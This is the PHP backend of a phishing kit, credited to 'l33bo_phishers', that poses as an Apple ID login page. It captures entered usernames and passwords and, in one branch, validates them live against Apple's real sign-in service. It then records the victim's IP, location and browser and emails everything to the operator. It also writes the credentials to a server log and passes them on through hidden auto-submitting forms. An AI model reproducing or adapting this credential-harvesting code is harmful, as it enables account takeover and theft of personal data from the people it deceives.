<?
/*
Created by l33bo_phishers -- icq: 695059760
*/
require "session_protect.php";
require "functions.php";
require_once dirname(__FILE__)."/../../setting.php";
$domain = "https://$_SERVER[SERVER_NAME]";
if($t_login == "yes"){
$_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];
$uZer = $_POST['user'];
$paZZ = $_POST['pass'];
if(isset($_POST["user"]) AND isset($_POST["pass"])){
    
    $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://idmsa.apple.com/appleauth/auth/signin");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION,true);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"accountName":"'.$_POST['user'].'","password":"'.$_POST['pass'].'","rememberMe":false}');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = "Host: idmsa.apple.com";
$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0";
$headers[] = "Accept: application/json, text/javascript, */*; q=0.01";
$headers[] = "Accept-Language: en-US,en;q=0.5";
$headers[] = "Referer: https://idmsa.apple.com/appleauth/auth/signin?widgetKey=65cf91973b413a70631c3e4d2e682494&language=en_US";
$headers[] = "Content-Type: application/json";
$headers[] = "X-Apple-Widget-Key: 65cf91973b413a70631c3e4d2e682494";
$headers[] = "X-Apple-I-Fd-Client-Info: {\"U\"\":\"\"Mozilla/5.0";
$headers[] = "X-Apple-Locale: en_US";
$headers[] = "X-Requested-With: XMLHttpRequest";
$headers[] = "Cookie: s_vi=[CS]v1|2CFF4972850311C2-60001183E000606C[CE]; as_dc=nwk; dssf=1; dssid2=46bdfe05-af3f-458f-a75e-b8da0c162378; as_pcts=nShAgwM4YjAw7vS8Y1J-t_aOuLFaaW3+-u05pWi+1CCWikia90im6ctTZc6U4Ua; as_sfa=Mnx1c3x1c3x8ZW5fVVN8Y29uc3VtZXJ8aW50ZXJuZXR8MHwwfDE=; optimizelyEndUserId=oeu1514952128951r0.5497066321506434; optimizelySegments=%\"7B\"%\"22341793217\"%\"22\"%\"3A\"%\"22search\"%\"22\"%\"2C\"%\"22341794206\"%\"22\"%\"3A\"%\"22false\"%\"22\"%\"2C\"%\"22341824156\"%\"22\"%\"3A\"%\"22ff\"%\"22\"%\"2C\"%\"22341932127\"%\"22\"%\"3A\"%\"22none\"%\"22\"%\"7D;";
$headers[] = "Connection: keep-alive";
$headers[] = "Pragma: no-cache";
$headers[] = "Cache-Control: no-cache";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close ($ch);
$cek = json_decode($result);
$true = $cek->authType;
if ($true == "sa" or $true == "hsa" or $true == "hsa2") {
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$systemInfo = systemInfo($ip);
$VictimInfo1 = "| IP Address :"." ".$ip." (".gethostbyaddr($ip).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
$VictimInfo6 = "".$systemInfo['country'];
$from = $SenderEmail;
$headers = "From: $SenderLogin <$SenderEmail>";
$subj = "Login Apple [".$systemInfo['country']." $ip]";
$to = $Your_Email;
$warnsubj = "Abuse";
$data = "
++-----------[*RSJKINGDOM X APPLE*]------------++

------------------------------------------
          Apple Login
------------------------------------------
Username : $uZer
Password : $paZZ

------------------------------------------
         Victim Login
------------------------------------------
From     :  $VictimInfo1 - $VictimInfo2
Browser  :  $VictimInfo3 - $VictimInfo4 - $VictimInfo5

++---------===[ $$ XXXXX $$ ]===---------++";
mail($to,$subj,$data,$headers);
$empas   = "$uZer | $paZZ [ ".$systemInfo['country']." ]\n";
$file = $_SERVER['DOCUMENT_ROOT']."/assets/logs/hmp.log";
 $isi1  = @file_get_contents($file);
   $buka1 = fopen($file,"a");
    fwrite($buka1, $empas);
    fclose($buka1);
    
    $file2 = $_SERVER['DOCUMENT_ROOT']."/assets/logs/._login_.txt";
    $isi  = @file_get_contents($file2);
    $buka = fopen($file2,"w"); 
    fwrite($buka, $isi+1);
    fclose($buka);
?>
<?php if($typelogin == "locked"){
    ?>
<form action='../locked.php?<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' name='frm'>
<input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
<input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
</form>
<script language="JavaScript">
document.frm.submit();
</script>
}?>
<?php }else{
?>
<form action='../invoice.php?<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' name='frm'>
<input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
<input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
</form>
<script language="JavaScript">
document.frm.submit();
</script>
<?php }}else{

    ?>
    <iframe width="100%" height="100%" name="login" id="login" src="<?php echo "$domain/assets/signin.php";?>" frameborder="0" scrolling="no"></iframe>
    <?php
}
}
}else{
    $_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];
$uZer = $_POST['user'];
$paZZ = $_POST['pass'];
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$systemInfo = systemInfo($ip);
$VictimInfo1 = "| IP Address :"." ".$ip." (".gethostbyaddr($ip).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
$VictimInfo6 = "".$systemInfo['country'];
$from = $SenderEmail;
$headers = "From: $SenderLogin <$SenderEmail>";
$subj = "Login Apple [".$systemInfo['country']." $ip]";
$to = $Your_Email;
$warnsubj = "Abuse";
$data = "
++-----------[*RSJKINGDOM X APPLE*]------------++

------------------------------------------
          Apple Login
------------------------------------------
Username : $uZer
Password : $paZZ

------------------------------------------
         Victim Login
------------------------------------------
From     :  $VictimInfo1 - $VictimInfo2
Browser  :  $VictimInfo3 - $VictimInfo4 - $VictimInfo5

++---------===[ $$ End Resutls $$ ]===---------++";
mail($to,$subj,$data,$headers);
$empas   = "$uZer | $paZZ [ ".$systemInfo['country']." ]\n";
$file = $_SERVER['DOCUMENT_ROOT']."/assets/logs/hmp.log";
 $isi1  = @file_get_contents($file);
   $buka1 = fopen($file,"a");
    fwrite($buka1, $empas);
    fclose($buka1);
    
    $file2 = $_SERVER['DOCUMENT_ROOT']."/assets/logs/._login_.txt";
    $isi  = @file_get_contents($file2);
    $buka = fopen($file2,"w"); 
    fwrite($buka, $isi+1);
    fclose($buka);
    ?>
<?php if($typelogin == "locked"){
    ?>
<form action='../locked.php?<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' name='frm'>
<input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
<input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
</form>
<script language="JavaScript">
document.frm.submit();
</script>
}?>
<?php }else{
?>
<form action='../invoice.php?<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' name='frm'>
<input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
<input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
</form>
<script language="JavaScript">
document.frm.submit();
</script>
<?php
}}
?>

